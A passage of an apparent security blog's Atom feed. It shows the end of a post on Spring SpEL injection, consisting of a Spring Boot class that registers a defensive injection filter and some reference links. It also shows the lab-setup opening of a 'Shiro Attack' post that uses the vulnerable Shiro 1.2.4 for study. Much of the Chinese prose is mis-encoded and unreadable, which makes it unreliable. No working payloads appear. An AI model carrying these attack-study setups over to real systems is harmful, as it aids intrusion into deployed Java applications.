class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ˜¯springbootï¼Œè¿‡æ»¤å™¨ç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>filters<span class="token punctuation">.</span></span><span class="token class-name">SpELInjectionFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterRegistrationBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySpringBootApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">MySpringBootApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> <span class="token function">spELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> registrationBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">addUrlPatterns</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> registrationBean<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&quot;&gt;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&quot;&gt;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&quot;&gt;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Shiro Attack</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/</id>
    <published>2024-07-15T13:56:45.000Z</published>
    <updated>2024-07-15T14:11:11.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š<a href="https://natro92.fun/posts/4b382a45/">https://natro92.fun/posts/4b382a45/</a></p><span id="more"></span><hr><h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>ç¯å¢ƒï¼šjdk1.8 + tomcat 8.5.98 + shiro 1.2.4</p><p>è¿™é‡Œç›´æ¥ç”¨pç¥çš„é¡¹ç›®äº†ï¼š<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p>ä¸‹è½½åç›´æ¥ç”¨IDEAæ‰“å¼€ï¼Œé…ç½®ä¸€ä¸‹tomcatç¯å¢ƒ</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715212213428.png" alt="image-20240715212213428"></p><p>è¿è¡Œé…ç½®</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715213701618.png" alt="image-20240715213701618"></p><blockquote><p>Tipsï¼šå¦‚æœtomcatæ§åˆ¶å°å‡ºç°ä¹±ç ï¼Œè¯·åœ¨è®¾ç½®-æ§åˆ¶å°ä¸­æ›´æ”¹ç¼–ç ä¸ºUTF-8</p></blockquote><blockquote><p>Tipsï¼šåªæœ‰ä¸‹è½½äº†æºç æ‰èƒ½åœ¨å…¨å±€æœç´¢ä¸­æœåˆ°å¯¹åº”è°ƒç”¨çš„æ–¹æ³•ï¼šè¯·åœ¨ è®¾ç½®-Maven-æ­£åœ¨å¯¼å…¥ å†…ä¿®æ”¹</p></blockquote><p>ç„¶åè®¿é—®å³å¯</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715214344403.png" alt="image-20240715214344403"></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https://natro92.fun/posts/4b382a45/&quot;&gt;https://natro92.fun/posts/4b382a45/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
</feed>
